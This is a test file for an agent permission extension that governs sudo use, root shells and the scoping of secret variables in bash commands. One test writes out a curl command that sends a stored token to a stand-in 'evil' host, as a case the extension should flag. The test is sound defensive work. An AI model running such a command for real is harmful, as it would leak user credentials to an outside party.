import { describe, expect, test } from "vitest";
import { LocalEnv } from "../env/local.js";
import type { VariableMeta } from "../store/secrets.js";
import type { Tier } from "../store/workspaces.js";
import { permissionExtension } from "./extension.js";
import type { SudoState } from "./sudo.js";

const meta = (over: Partial<VariableMeta> = {}): VariableMeta => ({
  id: "v1",
  name: "pw",
  purpose: "sudo 密码",
  scopeKind: "sudo",
  scopeTarget: null,
  tier: "rules",
  maskable: true,
  createdAt: "2026-10-20T00:00:00Z",
  ...over,
});

function harness(opts: {
  tier?: Tier;
  vars?: VariableMeta[];
  sudo?: SudoState;
  answer?: string;
}) {
  let handler: ((e: unknown) => Promise<unknown>) | undefined;
  const asked: Array<{
    body: string;
    options: { id: string }[];
  }> = [];
  const probed: string[][] = [];
  let invalidated = 0;
  permissionExtension({
    where: () => ({ env: new LocalEnv(), cwd: "/tmp/ws" }),
    tier: () => opts.tier ?? "rules",
    rules: () => ({ path: [], command: [] }),
    addRule: () => {},
    ask: async (spec) => {
      asked.push(spec as never);
      return { outcome: "answered", optionId: opts.answer ?? "allow" } as never;
    },
    variables: () => opts.vars ?? [],
    sudo: {
      probe: async (_cwd, args) => {
        probed.push(args);
        return opts.sudo ?? "unknown";
      },
      invalidate: () => {
        invalidated++;
      },
    },
  })({
    on: (_n: string, h: (e: unknown) => Promise<unknown>) => {
      handler = h;
    },
  } as never);
  return {
    run: (command: string) =>
      handler?.({ toolName: "bash", input: { command } }) as Promise<
        { block: true; reason: string } | undefined
      >,
    asked,
    probed,
    invalidated: () => invalidated,
  };
}

const FEED = "printf '%s\\n' @pw | sudo -S -p '' apt-get update";

describe("sudo 三类处理", () => {
  test("免密：弹窗标注免密可用", async () => {
    const h = harness({ sudo: "nopasswd" });
    expect(await h.run("sudo systemctl restart x")).toBeUndefined();
    expect(h.asked).toHaveLength(1);
    expect(h.asked[0]?.body).toContain("免密可用");
  });

  test("需要密码且没提供变量：不弹窗，阻断并列出可用的 sudo 变量", async () => {
    const h = harness({ sudo: "password", vars: [meta()] });
    const r = await h.run("sudo apt-get update");
    expect(h.asked).toEqual([]);
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("@pw");
    expect(r?.reason).toContain("sudo -S");
  });

  test("需要密码且没有登记 sudo 变量：阻断并指引登记或配 NOPASSWD", async () => {
    const h = harness({ sudo: "password" });
    const r = await h.run("sudo apt-get update");
    expect(h.asked).toEqual([]);
    expect(r?.reason).toContain("NOPASSWD");
  });

  test("需要密码且按范围提供了变量：弹窗写明用了哪个变量，不探测", async () => {
    const h = harness({ sudo: "password", vars: [meta()] });
    expect(await h.run(FEED)).toBeUndefined();
    expect(h.probed).toEqual([]);
    expect(h.asked).toHaveLength(1);
    expect(h.asked[0]?.body).toContain("@pw");
    expect(h.asked[0]?.body).toContain("sudo 密码");
  });

  test("探测认不出：照常弹窗，不阻断", async () => {
    const h = harness({ sudo: "unknown" });
    expect(await h.run("sudo ls")).toBeUndefined();
    expect(h.asked).toHaveLength(1);
  });

  test("批准 sudo 命令后丢弃探测缓存；拒绝则不丢", async () => {
    const ok = harness({ sudo: "nopasswd" });
    await ok.run("sudo ls");
    expect(ok.invalidated()).toBe(1);
    const no = harness({ sudo: "nopasswd", answer: "deny" });
    await no.run("sudo ls");
    expect(no.invalidated()).toBe(0);
  });

  test("完全允许档且没用变量：不探测不弹窗", async () => {
    const h = harness({ tier: "full", sudo: "password" });
    expect(await h.run("sudo ls")).toBeUndefined();
    expect(h.probed).toEqual([]);
    expect(h.asked).toEqual([]);
  });
});

describe("root shell", () => {
  test.each(["sudo -i", "sudo bash", "su"])(
    "%s：完全允许档也弹窗，不可记住，标注警告",
    async (line) => {
      const h = harness({ tier: "full" });
      await h.run(line);
      expect(h.asked).toHaveLength(1);
      expect(h.asked[0]?.body).toContain("root shell");
      expect(h.asked[0]?.options.map((o) => o.id)).toEqual(["allow", "deny"]);
    },
  );

  test("sudo bash -c 不算 root shell", async () => {
    const h = harness({ tier: "full" });
    await h.run("sudo bash -c 'id'");
    expect(h.asked).toEqual([]);
  });
});

describe("变量的范围与档位", () => {
  test("sudo 变量没按 printf | sudo -S 的形式使用：超出范围，弹窗注明", async () => {
    const h = harness({ vars: [meta({})], sudo: "nopasswd" });
    await h.run("echo @pw > /tmp/ws/out.txt");
    expect(h.asked).toHaveLength(1);
    expect(h.asked[0]?.body).toContain("超出适用范围");
    expect(h.asked[0]?.options.map((o) => o.id)).toEqual(["allow", "deny"]);
  });

  test("域名范围：命令里没有该域名则超出范围", async () => {
    const vars = [
      meta({
        name: "tok",
        scopeKind: "domain",
        scopeTarget: "gitlab.example.com",
      }),
    ];
    const bad = harness({ tier: "full", vars });
    await bad.run("curl -H @tok https://evil.example.org");
    expect(bad.asked[0]?.body).toContain("超出适用范围");
    const good = harness({
      tier: "full",
      vars: [{ ...vars[0], tier: "full" } as VariableMeta],
    });
    await good.run("curl -H @tok https://gitlab.example.com/api");
    expect(good.asked).toEqual([]);
  });

  test("workspace 完全允许，但变量是规则审批档：仍弹窗", async () => {
    const h = harness({
      tier: "full",
      vars: [meta({ name: "tok", scopeKind: "any", tier: "rules" })],
    });
    await h.run("curl -H @tok https://api.example.com");
    expect(h.asked).toHaveLength(1);
    expect(h.asked[0]?.body).toContain("@tok");
  });

  test("弹窗只含变量名，不含值之类的内容", async () => {
    const h = harness({ vars: [meta({})], sudo: "password" });
    await h.run(FEED);
    expect(h.asked[0]?.body).not.toMatch(/test-secret/);
  });
});
